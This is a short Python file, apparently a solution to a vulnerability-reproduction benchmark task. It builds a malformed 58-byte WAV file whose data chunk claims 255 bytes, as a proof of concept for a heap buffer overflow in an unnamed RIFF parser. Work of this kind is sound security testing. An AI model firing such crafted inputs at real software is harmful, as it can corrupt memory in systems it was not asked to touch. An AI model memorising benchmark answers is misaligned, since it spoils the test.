import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the heap buffer overflow vulnerability in RIFF parsing.
        The vulnerability occurs when a subchunk's size is not validated against the parent RIFF chunk's size.
        """
        # Construct a 58-byte WAV file (RIFF format)
        
        # 1. RIFF Header
        # "RIFF" (4 bytes)
        # ChunkSize (4 bytes): 50 (Total file size 58 - 8 bytes header)
        # "WAVE" (4 bytes)
        riff_header = b'RIFF' + struct.pack('<I', 50) + b'WAVE'
        
        # 2. fmt chunk
        # "fmt " (4 bytes)
        # Subchunk1Size (4 bytes): 16 for PCM
        # AudioFormat (2 bytes): 1 (PCM)
        # NumChannels (2 bytes): 1
        # SampleRate (4 bytes): 44100
        # ByteRate (4 bytes): 88200
        # BlockAlign (2 bytes): 2
        # BitsPerSample (2 bytes): 16
        fmt_chunk = b'fmt ' + struct.pack('<I', 16) + \
                    struct.pack('<H', 1) + \
                    struct.pack('<H', 1) + \
                    struct.pack('<I', 44100) + \
                    struct.pack('<I', 88200) + \
                    struct.pack('<H', 2) + \
                    struct.pack('<H', 16)
        
        # 3. data chunk (The vulnerable chunk)
        # "data" (4 bytes)
        # Subchunk2Size (4 bytes): 0xFF (255). 
        # This size is significantly larger than the remaining bytes in the RIFF chunk (which is 14 bytes).
        # A vulnerable parser will read past the end of the allocated buffer based on this size.
        data_header = b'data' + struct.pack('<I', 255)
        
        # 4. Payload
        # 14 bytes of data to pad the file to exactly 58 bytes
        # (12 header + 24 fmt + 8 data_header + 14 payload = 58)
        payload = b'\x00' * 14
        
        return riff_header + fmt_chunk + data_header + payload
